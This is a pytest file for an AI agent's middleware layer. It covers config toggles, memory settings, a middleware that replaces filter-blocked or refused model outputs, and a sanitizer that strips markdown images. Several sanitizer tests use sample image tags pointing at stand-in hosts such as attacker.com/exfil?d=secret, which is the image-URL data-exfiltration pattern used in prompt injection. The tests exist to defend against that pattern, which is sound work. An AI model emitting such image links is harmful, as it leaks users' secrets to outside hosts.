"""Unit tests for the middleware builder module."""

from unittest.mock import MagicMock, patch

import pytest

from deep_agent.src.agent.config.middleware import ResolvedMiddlewareConfig
from deep_agent.src.infrastructure.middleware import (
    _build_model_fallback,
    _build_summarization_tool_middleware,
    _import_middleware,
    build_excluded_middleware,
    build_middleware_list,
    resolve_memory_param,
)


class TestBuildMiddlewareList:
    """Test middleware instance construction from resolved config."""

    @pytest.fixture(autouse=True)
    def _disable_audit_and_opa(self):
        with (
            patch(
                "deep_agent.src.audit.config.is_audit_enabled",
                return_value=False,
            ),
            patch(
                "deep_agent.src.opa.config.is_opa_enabled",
                return_value=False,
            ),
        ):
            yield

    def test_returns_only_safety_when_master_switch_off(self):
        resolved = ResolvedMiddlewareConfig(summarization_tool_enabled=True)
        with patch(
            "deep_agent.src.infrastructure.middleware.settings"
        ) as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = False
            result = build_middleware_list(resolved)
        # GeminiSafetyLogMiddleware + ImageSanitizeMiddleware always included regardless of master switch
        assert len(result) == 2
        assert type(result[0]).__name__ == "GeminiSafetyLogMiddleware"
        assert type(result[1]).__name__ == "ImageSanitizeMiddleware"

    def test_includes_summarization_tool_when_enabled(self):
        resolved = ResolvedMiddlewareConfig(summarization_tool_enabled=True)
        mock_mw = MagicMock()
        with (
            patch("deep_agent.src.infrastructure.middleware.settings") as mock_settings,
            patch(
                "deep_agent.src.infrastructure.middleware._build_summarization_tool_middleware",
                return_value=mock_mw,
            ),
        ):
            mock_settings.MIDDLEWARE_ENABLED = True
            result = build_middleware_list(resolved)
        assert mock_mw in result

    def test_excludes_summarization_tool_when_disabled(self):
        resolved = ResolvedMiddlewareConfig(
            summarization_tool_enabled=False, extra_middleware=[]
        )
        with (
            patch("deep_agent.src.infrastructure.middleware.settings") as mock_settings,
            patch(
                "deep_agent.src.infrastructure.middleware._build_summarization_tool_middleware",
            ) as build_sum,
        ):
            mock_settings.MIDDLEWARE_ENABLED = True
            result = build_middleware_list(resolved)
            build_sum.assert_not_called()
        # Default guardrails (model/tool limits + model retry) + safety + image sanitize middleware.
        assert len(result) == 5

    def test_includes_extra_middleware(self):
        resolved = ResolvedMiddlewareConfig(
            summarization_tool_enabled=False,
            extra_middleware=[
                "tests.unit.test_infrastructure_middleware:_DummyMiddleware"
            ],
        )
        with patch(
            "deep_agent.src.infrastructure.middleware.settings"
        ) as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = build_middleware_list(resolved)
        assert len(result) == 6
        assert any(isinstance(m, _DummyMiddleware) for m in result)


class TestBuildExcludedMiddleware:
    """Test excluded middleware list generation."""

    def test_empty_when_all_enabled(self):
        resolved = ResolvedMiddlewareConfig(
            patch_tool_calls_enabled=True, excluded_middleware=[]
        )
        result = build_excluded_middleware(resolved)
        assert result == []

    def test_includes_patch_tool_calls_when_disabled(self):
        resolved = ResolvedMiddlewareConfig(
            patch_tool_calls_enabled=False, excluded_middleware=[]
        )
        result = build_excluded_middleware(resolved)
        assert "PatchToolCallsMiddleware" in result

    def test_preserves_profile_exclusions(self):
        resolved = ResolvedMiddlewareConfig(
            patch_tool_calls_enabled=True,
            excluded_middleware=["SomeCustomMiddleware"],
        )
        result = build_excluded_middleware(resolved)
        assert "SomeCustomMiddleware" in result


class TestResolveMemoryParam:
    """Test memory parameter resolution for create_deep_agent()."""

    def test_returns_none_when_master_disabled(self):
        resolved = ResolvedMiddlewareConfig(memory_enabled=True)
        with patch(
            "deep_agent.src.infrastructure.middleware.settings"
        ) as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = False
            result = resolve_memory_param(resolved)
        assert result is None

    def test_returns_none_when_memory_disabled(self):
        resolved = ResolvedMiddlewareConfig(memory_enabled=False)
        with patch(
            "deep_agent.src.infrastructure.middleware.settings"
        ) as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = resolve_memory_param(resolved)
        assert result is None

    def test_returns_namespaces_when_enabled(self):
        resolved = ResolvedMiddlewareConfig(
            memory_enabled=True, memory_namespaces=["user_mem", "shared"]
        )
        with patch(
            "deep_agent.src.infrastructure.middleware.settings"
        ) as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = resolve_memory_param(resolved)
        assert result == ["user_mem", "shared"]

    def test_stock_memories_maps_to_user_profile(self):
        resolved = ResolvedMiddlewareConfig(
            memory_enabled=True, memory_namespaces=["memories"]
        )
        with patch(
            "deep_agent.src.infrastructure.middleware.settings"
        ) as mock_settings:
            mock_settings.MIDDLEWARE_ENABLED = True
            result = resolve_memory_param(resolved)
        assert result == ["/memories/user_profile.md"]


class TestImportMiddleware:
    """Test dynamic middleware importing."""

    def test_invalid_path_without_colon(self):
        result = _import_middleware("no_colon_here")
        assert result is None

    def test_nonexistent_module(self):
        result = _import_middleware("nonexistent.module:Class")
        assert result is None

    def test_valid_import(self):
        result = _import_middleware(
            "tests.unit.test_infrastructure_middleware:_DummyMiddleware"
        )
        assert result is not None


class TestGeminiSafetyLogMiddleware:
    """Test the GeminiSafetyLogMiddleware after_model hook."""

    def _build_middleware(self):
        from deep_agent.src.infrastructure.middleware import (
            _build_gemini_safety_log_middleware,
        )

        return _build_gemini_safety_log_middleware()

    def test_returns_none_for_normal_message(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [AIMessage(content="Hello!", id="msg1")]}
        assert mw.after_model(state, None) is None

    @pytest.mark.parametrize(
        "finish_reason",
        [
            "SAFETY",
            "RECITATION",
            "BLOCKLIST",
            "PROHIBITED_CONTENT",
            "IMAGE_SAFETY",
            "SPII",
            "refusal",
        ],
    )
    def test_replaces_candidate_level_safety_blocked_message(self, finish_reason):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={"finish_reason": finish_reason, "safety_ratings": []},
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        replaced = result["messages"][-1]
        assert "content safety filter" in replaced.content
        assert replaced.id == "msg1"

    def test_replaces_anthropic_refusal_via_stop_reason(self):
        """ChatAnthropicVertex sets stop_reason, not finish_reason."""
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={"stop_reason": "refusal", "stop_sequence": None},
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        assert "content safety filter" in result["messages"][-1].content

    def test_ignores_non_safety_empty_message(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        msg = AIMessage(
            content="",
            id="msg1",
            response_metadata={"finish_reason": "stop"},
        )
        state = {"messages": [msg]}
        assert mw.after_model(state, None) is None

    def test_ignores_non_ai_message(self):
        from langchain_core.messages import HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [HumanMessage(content="hi")]}
        assert mw.after_model(state, None) is None

    def test_replaces_prompt_level_safety_block(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={
                "prompt_feedback": {
                    "block_reason": "SAFETY",
                    "safety_ratings": [{"category": "HARM_CATEGORY_DANGEROUS_CONTENT"}],
                }
            },
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        replaced = result["messages"][-1]
        assert "content safety filter" in replaced.content
        assert replaced.id == "msg1"

    @pytest.mark.parametrize(
        "block_reason",
        ["BLOCKLIST", "PROHIBITED_CONTENT", "JAILBREAK", "IMAGE_SAFETY", "MODEL_ARMOR"],
    )
    def test_replaces_prompt_level_block_reasons(self, block_reason):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        blocked = AIMessage(
            content="",
            id="msg1",
            response_metadata={
                "prompt_feedback": {"block_reason": block_reason, "safety_ratings": []}
            },
        )
        state = {"messages": [blocked]}
        result = mw.after_model(state, None)
        assert result is not None
        assert "content safety filter" in result["messages"][-1].content

    def test_ignores_prompt_feedback_with_unspecified_block_reason(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        msg = AIMessage(
            content="",
            id="msg1",
            response_metadata={
                "prompt_feedback": {"block_reason": 0, "safety_ratings": []}
            },
        )
        state = {"messages": [msg]}
        assert mw.after_model(state, None) is None


class TestImageSanitizeMiddleware:
    """Test the ImageSanitizeMiddleware before_model and after_model hooks."""

    def _build_middleware(self):
        from deep_agent.src.infrastructure.middleware import (
            _build_image_sanitize_middleware,
        )

        return _build_image_sanitize_middleware()

    def test_strips_image_tag_from_ai_response(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="Here ![test](https://attacker.com/?d=secret)", id="msg1"
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "Here test"
        assert result["messages"][-1].id == "msg1"

    def test_strips_empty_alt_image_tag(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="Data ![](https://attacker.com/?d=secret) here", id="msg1"
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "Data  here"

    def test_strips_multiple_image_tags(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="![a](https://evil.com/1) and ![b](https://evil.com/2)",
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "a and b"

    def test_ignores_normal_ai_message(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [AIMessage(content="Hello, no images here!", id="msg1")]}
        assert mw.after_model(state, None) is None

    def test_ignores_markdown_links(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(content="Click [here](https://example.com)", id="msg1")
            ]
        }
        assert mw.after_model(state, None) is None

    def test_strips_image_tag_from_user_input(self):
        from langchain_core.messages import HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                HumanMessage(
                    content="![img](https://attacker.com/steal?d=secret)", id="msg1"
                )
            ]
        }
        result = mw.before_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "img"
        assert result["messages"][-1].id == "msg1"

    def test_ignores_normal_user_message(self):
        from langchain_core.messages import HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [HumanMessage(content="What is my BMI?", id="msg1")]}
        assert mw.before_model(state, None) is None

    def test_ignores_empty_state(self):
        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        assert mw.before_model({"messages": []}, None) is None
        assert mw.after_model({"messages": []}, None) is None

    def test_strips_protocol_relative_url(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [AIMessage(content="![logo](//attacker.com/steal)", id="msg1")]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "logo"

    def test_strips_nested_image_tags(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="![![inner](https://decoy.com)](https://attacker.com/steal)",
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert "attacker" not in result["messages"][-1].content
        assert "![" not in result["messages"][-1].content

    def test_strips_image_from_tool_message(self):
        from langchain_core.messages import ToolMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                ToolMessage(
                    content="Result: ![chart](https://attacker.com/exfil?d=secret)",
                    tool_call_id="tc1",
                )
            ]
        }
        result = mw.before_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == "Result: chart"

    def test_sanitizes_all_human_messages(self):
        from langchain_core.messages import AIMessage, HumanMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                HumanMessage(content="![old](https://evil.com/1)", id="m1"),
                AIMessage(content="Sure", id="m2"),
                HumanMessage(content="![new](https://evil.com/2)", id="m3"),
            ]
        }
        result = mw.before_model(state, None)
        assert result is not None
        assert result["messages"][0].content == "old"
        assert result["messages"][2].content == "new"

    def test_ignores_clean_tool_message(self):
        from langchain_core.messages import ToolMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {"messages": [ToolMessage(content="BMI is 25.7", tool_call_id="tc1")]}
        assert mw.before_model(state, None) is None

    def test_strips_reference_style_image(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content="![a][ref]\n\n[ref]: https://attacker.example/x",
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        sanitized = result["messages"][-1].content
        assert "attacker" not in sanitized
        assert "![a]" not in sanitized
        assert "[ref]:" not in sanitized.lower()

    def test_handles_list_content_blocks(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content=[
                        {"type": "text", "text": "![a](https://attacker.example/x)"}
                    ],
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == [{"type": "text", "text": "a"}]

    def test_handles_string_elements_in_content_list(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        state = {
            "messages": [
                AIMessage(
                    content=["![x](https://attacker.example/x)"],
                    id="msg1",
                )
            ]
        }
        result = mw.after_model(state, None)
        assert result is not None
        assert result["messages"][-1].content == ["x"]

    def test_preserves_link_reference_definitions(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        content = "See [docs][ref] for details.\n\n[ref]: https://example.com/docs"
        state = {"messages": [AIMessage(content=content, id="msg1")]}
        assert mw.after_model(state, None) is None

    def test_preserves_tool_calls(self):
        from langchain_core.messages import AIMessage

        mw = self._build_middleware()
        if mw is None:
            pytest.skip("AgentMiddleware not available")
        msg = AIMessage(
            content="![x](https://evil.com/steal)",
            id="msg1",
            tool_calls=[{"name": "calculate_bmi", "args": {"h": 172}, "id": "tc1"}],
        )
        state = {"messages": [msg]}
        result = mw.after_model(state, None)
        assert result is not None
        replaced = result["messages"][-1]
        assert replaced.content == "x"
        assert len(replaced.tool_calls) == 1
        assert replaced.tool_calls[0]["name"] == "calculate_bmi"
        assert replaced.tool_calls[0]["args"] == {"h": 172}
        assert replaced.tool_calls[0]["id"] == "tc1"


class _DummyMiddleware:
    """Test fixture — a no-op middleware class."""

    pass


class TestBuildModelFallbackEdgeCases:
    """Test edge cases for _build_model_fallback."""

    def test_exception_in_init_returns_none(self):
        with patch(
            "langchain.agents.middleware.ModelFallbackMiddleware",
            side_effect=Exception("model init failed"),
        ):
            result = _build_model_fallback("some-model")
        assert result is None


class TestBuildSummarizationToolMiddlewareEdgeCases:
    """Test edge cases for _build_summarization_tool_middleware."""

    def test_none_model_returns_none(self):
        result = _build_summarization_tool_middleware(model=None, backend=MagicMock())
        assert result is None

    def test_none_backend_returns_none(self):
        result = _build_summarization_tool_middleware(model=MagicMock(), backend=None)
        assert result is None

    def test_exception_during_creation_returns_none(self):
        with patch(
            "deepagents.middleware.summarization.create_summarization_tool_middleware",
            side_effect=Exception("creation error"),
        ):
            result = _build_summarization_tool_middleware(
                model=MagicMock(), backend=MagicMock()
            )
        assert result is None
